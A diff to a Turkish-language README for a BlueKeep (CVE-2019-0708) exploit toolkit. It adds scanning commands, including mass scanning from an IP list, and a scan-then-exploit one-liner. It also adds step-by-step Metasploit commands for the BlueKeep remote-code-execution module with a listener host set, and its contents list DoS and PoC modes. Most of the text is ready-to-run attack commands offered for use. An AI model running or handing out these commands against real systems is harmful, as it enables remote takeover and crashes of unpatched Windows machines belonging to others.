@@ -9,6 +9,7 @@ Bu toolkit, BlueKeep (CVE-2019-0708) güvenlik açığından etkilenen Windows s
 - [Desteklenen Sistemler](#desteklenen-sistemler)
 - [Kurulum](#kurulum)
 - [Kullanım](#kullanım)
+  - [Vulnerability Scanning](#vulnerability-scanning)
   - [Proof of Concept (PoC)](#proof-of-concept-poc)
   - [Denial of Service (DoS)](#denial-of-service-dos)
   - [Metasploit ile Sömürü](#metasploit-ile-sömürü)
@@ -59,6 +60,29 @@ python3 bluekeep_runner.py -i HEDEF_IP
 
 ## Kullanım
 
+### Vulnerability Scanning
+
+BlueKeep açığını taramak için öncelikle Metasploit ile tarama yapabilirsiniz:
+
+```bash
+msfconsole -q
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+set RHOSTS HEDEF_IP
+set RPORT 3389
+run
+```
+
+Ya da sağlanan Python script ile:
+
+```bash
+python3 bluekeep_scanner.py -i HEDEF_IP -p 3389
+```
+
+Bir IP listesini taramak için:
+```bash
+python3 bluekeep_scanner.py -f ip_listesi.txt
+```
+
 ### Proof of Concept (PoC)
 
 PoC modunu çalıştırmak için:
@@ -99,6 +123,23 @@ Parametreler:
 - `-f`: Otomatik kontrol atlamayı zorla (varsayılan: Evet)
 - `-v`: Ayrıntılı çıktı
 - `-d`: Hata ayıklama modu
+
+#### Tarama ve Sömürü
+Tek bir komutla tarama ve açık varsa sömürme:
+```bash
+python3 metasploit_bluekeep.py --scan -i HEDEF_IP -l YEREL_IP -t 2
+```
+
+Veya manuel olarak Metasploit'te:
+```bash
+msfconsole -q
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS HEDEF_IP
+set RPORT 3389
+set LHOST YEREL_IP
+set TARGET 2
+run
+```
 
 #### Doğrudan Çalıştırma (Force Mode)
 ```bash
